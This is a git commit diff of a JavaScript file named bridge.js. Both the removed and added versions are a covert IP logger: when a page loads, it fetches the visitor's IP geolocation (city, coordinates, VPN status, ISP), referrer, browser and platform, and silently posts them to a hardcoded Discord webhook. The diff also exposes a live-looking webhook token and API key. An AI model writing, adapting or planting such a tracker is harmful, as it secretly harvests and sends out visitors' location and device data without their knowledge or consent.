21cb94a00e752613c84946c8a3071495a1e1c727
∅ח א כ ד ה יד∅ <cubedimension@protonmail.com>
2023-10-23 17:04:09 +0530

    Update bridge.js

--- bridge.js
+++ bridge.js
@@ -1,106 +1,56 @@
-// Function to send data to Discord webhook
-function sendToDiscord(ipData, userData) {
-    const webhookUrl = 'https://discord.com/api/webhooks/1165962811164348498/jgEsHpCRce9Kw8hY0IA4Ys9SN9dHMDVbVQmzp1J4BLVDjsCfMHyd2lcag4B0c5cKfIFT';
-
-    // Create a message payload
-    const message = {
-        content: "IP Details",
-        embeds: [
-            {
-                title: "IP Information",
-                fields: [
-                    { name: "IP Address", value: ipData.ip },
-                    { name: "City", value: ipData.city },
-                    { name: "Region", value: ipData.region },
-                    { name: "Country", value: ipData.country },
-                    { name: "Continent", value: ipData.continent },
-                ],
-            },
-            {
-                title: "Location",
-                fields: [
-                    { name: "Latitude", value: ipData.latitude },
-                    { name: "Longitude", value: ipData.longitude },
-                ],
-            },
-            {
-                title: "Security",
-                fields: [
-                    { name: "VPN", value: ipData.security.is_vpn ? "Yes" : "No" },
-                ],
-            },
-            {
-                title: "Timezone",
-                fields: [
-                    { name: "Timezone Name", value: ipData.timezone.name },
-                    { name: "Timezone Abbreviation", value: ipData.timezone.abbreviation },
-                    { name: "Current Time", value: ipData.timezone.current_time },
-                ],
-            },
-            {
-                title: "Flag",
-                image: { url: ipData.flag.png }, // Display the flag image
-            },
-            {
-                title: "Currency",
-                fields: [
-                    { name: "Currency Name", value: ipData.currency.currency_name },
-                    { name: "Currency Code", value: ipData.currency.currency_code },
-                ],
-            },
-            {
-                title: "Connection",
-                fields: [
-                    { name: "AS Number", value: ipData.connection.autonomous_system_number },
-                    { name: "AS Organization", value: ipData.connection.autonomous_system_organization },
-                    { name: "Connection Type", value: ipData.connection.connection_type },
-                    { name: "ISP Name", value: ipData.connection.isp_name },
-                ],
-            },
-            {
-                title: "User Information",
-                fields: [
-                    { name: "Date", value: userData.date.toString() },
-                    { name: "Day", value: userData.day },
-                    { name: "Time", value: userData.time },
-                    { name: "Referring URL", value: userData.referringURL },
-                    { name: "User Agent", value: userData.userAgent },
-                ],
-            },
-        ],
+function httpGetAsync(url, callback) {
+    const xmlHttp = new XMLHttpRequest();
+    xmlHttp.onreadystatechange = function () {
+        if (xmlHttp.readyState === 4 && xmlHttp.status === 200) {
+            callback(xmlHttp.responseText);
+        }
     };
-
-    // Send the message to Discord
-    fetch(webhookUrl, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json",
-        },
-        body: JSON.stringify(message),
-    })
-    .then(response => response.json())
-    .then(responseData => console.log("Data sent to Discord:", responseData))
-    .catch(error => console.error("Error sending data to Discord:", error));
+    xmlHttp.open("GET", url, true); // true for asynchronous
+    xmlHttp.send(null);
 }
 
-// Fetch IP address from Abstract API
-fetch("https://app.abstractapi.com/q", {
-    method: "GET",
-    headers: {
-        "X-API-KEY": "577cf8161d6e494bb7fb0df8e0b9102e", 
-})
-    .then(response => response.json())
-    .then(ipData => {
-        // Collect user information
-        const userInformation = {
-            date: new Date(),
-            day: new Intl.DateTimeFormat('en-US', { weekday: 'long' }).format(new Date()),
-            time: new Intl.DateTimeFormat('en-US', { timeStyle: 'short' }).format(new Date()),
-            referringURL: document.referrer,
-            userAgent: navigator.userAgent,
-        };
+function getUserInfo() {
+    const url = "https://ipgeolocation.abstractapi.com/v1/?api_key=577cf8161d6e494bb7fb0df8e0b9102e"; // Replace with your API key
+    httpGetAsync(url, function (response) {
+        const userData = JSON.parse(response);
 
-        // Send data to Discord webhook
-        sendToDiscord(ipData, userInformation);
-    })
-    .catch(error => console.error("Error fetching IP details: ", error));
+        // Extract user information (date, day, time, referring URL, browser, and device)
+        const date = new Date();
+        const day = date.toLocaleDateString();
+        const time = date.toLocaleTimeString();
+        const referringURL = document.referrer;
+        const browser = navigator.userAgent;
+        const device = navigator.platform;
+
+        // Construct the message to send to Discord
+        const message = `User Info:
+Date: ${day}
+Time: ${time}
+Referring URL: ${referringURL}
+Browser: ${browser}
+Device: ${device}
+
+IP Geolocation Info:
+IP Address: ${userData.ip_address}
+Country: ${userData.country}
+City: ${userData.city}
+Latitude: ${userData.latitude}
+Longitude: ${userData.longitude}`;
+
+        // Send the message to Discord using a webhook
+        sendToDiscordWebhook(message);
+    });
+}
+
+function sendToDiscordWebhook(message) {
+    const webhookUrl = "https://discord.com/api/webhooks/1165962811164348498/jgEsHpCRce9Kw8hY0IA4Ys9SN9dHMDVbVQmzp1J4BLVDjsCfMHyd2lcag4B0c5cKfIFT"; // Replace with your Discord webhook URL
+    const payload = JSON.stringify({ content: message });
+
+    const xhr = new XMLHttpRequest();
+    xhr.open("POST", webhookUrl, true);
+    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+    xhr.send(payload);
+}
+
+// Call the function to get user info and send it to Discord
+getUserInfo();
